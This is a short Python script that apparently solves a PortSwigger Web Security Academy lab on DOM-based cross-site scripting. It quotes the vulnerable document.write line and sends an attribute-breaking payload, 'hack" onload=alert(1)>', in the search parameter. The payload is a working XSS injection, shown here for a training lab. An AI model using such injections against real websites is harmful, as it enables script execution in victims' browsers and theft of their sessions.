'''
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function.

Lab link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
'''

import requests

# Vunlerable code found in page source: document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');

                    


lab_id = '0aff002d03c0076784e3793a003c005c' #change based on generated lab
payload = 'hack" onload=alert(1)>' # search paramter is vulnerable to dom XSS using document.write (see code above)
uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 

r = requests.get(uri)
if "solved" in r.text:
    print("solved")
else:
    print("nope")